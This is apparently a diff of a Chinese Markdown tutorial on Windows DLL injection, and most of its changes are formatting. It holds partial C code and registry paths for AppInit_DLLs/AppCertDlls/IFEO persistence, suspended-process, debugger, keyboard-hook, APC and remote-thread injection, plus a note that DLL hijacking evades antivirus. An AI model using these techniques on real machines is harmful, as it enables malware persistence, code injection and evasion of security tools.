@@ -28,9 +28,7 @@
 
 **Appinit_Dll/AppCertDlls/IFEO（映像劫持）可以用于注入和持久化。完整的路径如下：**
 
- 
-
-```
+```bat
 HKLM\Software\Microsoft\Windows NT\CurrentVersion\Windows\Appinit_Dll
 HKLM\Software\Wow6432Node\Microsoft\Windows\NT\CurrentVersion\Windows\Appinit_Dlls
 HKLM\System\CurrentControlSet\Control\Session Manager\AppCertDlls
@@ -40,11 +38,10 @@ HKLM\Software\Microsoft\Windows NT\CurrentVersion\image file execution options
 **1 使用AppInit_Dll**恶意软件能在AppInit_DLLs键下插入恶意的DLL的路径，以便其他进程加载。该键下每个DLL会被加载到所有的加载User32.dll的进程中。User32.dll是常见的Windows基础库。因此，当恶意软件修改这个子键时，大量进程将加载恶意的DLL。
 
 其中的**AppInit_Dlls**键的值可能包含一个Dll的文件名或一组Dll的文件名（通过空格或逗号分隔）。同时，为了让系统使用这个注册表值，还必须创建一个名为**LoadAppInit_Dlls**类型位DWORD的注册表项，并将它的值设为1.**缺点：**1.DLL只会被映射到使用了User32.dll的进程中，而非指定的进程.实际上很多进程并没有使用User32.dll2.映射的进程越多，“容器”进程奔溃的可能性就越大3.UEFI安全启动禁止Appinit_Dlls的相关内容（解决方法：在BIOS界面关闭相关UEFI安全启动功能即可）
+
 **2 AppCertDlls**
 
- 
-
-```
+```c
 void reg_inject_dll(LPCTSTR lpszExeName,LPCTSTR lpszDllName)
 {
     HKEY hKey;
@@ -66,14 +63,15 @@ void reg_inject_dll(LPCTSTR lpszExeName,LPCTSTR lpszDllName)
 
 
 3 IFEO
-二 挂起进程注入
 
- 
 
-```
+# 二 挂起进程注入
+
+```c
 #include <windows.h>
 #include <stddef.h>
 #include <cstring>
+
 //结构必须字节对齐1
 #pragma pack(1)  
 typedef struct _INJECT_CODE
@@ -93,6 +91,7 @@ typedef struct _INJECT_CODE
     CHAR  szDllPath[MAX_PATH];
 }INJECT_CODE, *PINJECT_CODE;
 #pragma pack()  
+
 int main()
 {
     //ShellCode();
@@ -148,13 +147,12 @@ int main()
 }
 ```
 
-**三 调试器注入**
+## 三 调试器注入
 
- 
-
-```
+```c
 #include <windows.h>
 #include <stddef.h>
+
 #pragma  pack(1)
 typedef struct _INJECT_CODE{
     BYTE  byMOV_EAX;          //mov eax, addr szDllpath
@@ -167,6 +165,7 @@ typedef struct _INJECT_CODE{
     CHAR  szDllPath[MAX_PATH];
 }INJECT_CODE, *PINJECT_CODE;
 #pragma  pack()
+
 int main()
 {
     BOOL bIsSystemBreak = TRUE;
@@ -264,31 +263,34 @@ int main()
 }
 ```
 
-**四 挂起线程注入**
+# 四 挂起线程注入
 
-# **五 \**钩子注入\****
+# 五 钩子注入
 
- 
-
-```
+```c
 #include <windows.h>
 #define DLL_EXPORT _declspec(dllexport) 
+
 #ifdef __cplusplus
 extern "C"{
 #endif // __cplusplus
     
 DLL_EXPORT BOOL SetHook(DWORD dwThreadId);
 DLL_EXPORT BOOL UnHook();
+
 #ifdef __cplusplus
 }
 #endif // __cplusplus
+
 // 共享段（注意：必须在声明同时初始化，否则共享段创建失败）
 #pragma  data_seg(".SHARE") 
 HMODULE g_hDllModule = NULL;
 HHOOK  g_hHook = NULL;
 #pragma  data_seg()
 #pragma  comment(linker,"/section:.SHARE,rws") 
+
 LRESULT CALLBACK KeyBoardProc(int nCode, WPARAM wParam, LPARAM lParam);
+
 BOOL WINAPI DllMain(HMODULE hDllModule, DWORD dwReason, LPVOID lpreserved){
     switch (dwReason){
     case DLL_PROCESS_ATTACH:
@@ -301,6 +303,7 @@ BOOL WINAPI DllMain(HMODULE hDllModule, DWORD dwReason, LPVOID lpreserved){
     }
     return TRUE;
 }
+
 // 在系统范围内装载钩子函数
 BOOL SetHook(DWORD dwThreadId){
     if (dwThreadId > 0){
@@ -312,6 +315,7 @@ BOOL SetHook(DWORD dwThreadId){
     }
     return FALSE;
 }
+
 // 下载钩子函数
 BOOL UnHook(){
     if (g_hHook != NULL){
@@ -322,6 +326,7 @@ BOOL UnHook(){
     }
     return FALSE;
 }
+
 LRESULT CALLBACK KeyBoardProc(int nCode, WPARAM wParam, LPARAM lParam)
 {
     MessageBox(NULL, "KEY PRESS", "钩子注入成功", MB_OK);
@@ -337,14 +342,11 @@ LRESULT CALLBACK KeyBoardProc(int nCode, WPARAM wParam, LPARAM lParam)
 }
 ```
 
-# 
+# 六 APC注入
 
-**六 APC注入**
-
- 
-
-```
+```c
 #include <windows.h>
+
 int WINAPI WinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPSTR lpCmdLine, _In_ int nShowCmd)
 {
     BOOL bRet = FALSE;
@@ -384,11 +386,9 @@ int WINAPI WinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _
 
 
 
-# **七 远程线程来注入DLL**
+# 七 远程线程来注入DLL
 
- 
-
-```
+```c
 const char * pDllPath = "E:\\CodeFile\\VC++\\MyInjectTools\\Release\\TestDll.dll";
 DWORD dwSize = strlen(pDllPath) + 1;
 DWORD dwWrite = 0;
@@ -412,11 +412,14 @@ if (hProcess != NULL){
 }
 ```
 
-***\*八 DLL劫持\**\**\*\*把我们知道进程必然会载入的一个DLL替换掉。\*\*\*\*缺点:\*\*\*\*不能自动适应版本变化。\*\*优点：利用白加黑把自己的dll运行起来且不会被杀毒软件报毒。
-\**\**九 导入表注入\**\**
-\**\**十 输入法注入\**\**\*\*\*\*
-\*\*\*\*十一 网络LSP注入\**
-**
+# 八 DLL劫持
+把我们知道进程必然会载入的一个DLL替换掉。
+缺点:不能自动适应版本变化。
+优点：利用白加黑把自己的dll运行起来且不会被杀毒软件报毒。
+九 导入表注入
+十 输入法注入
+十一 网络LSP注入
+
 
 **八 API拦截**
 
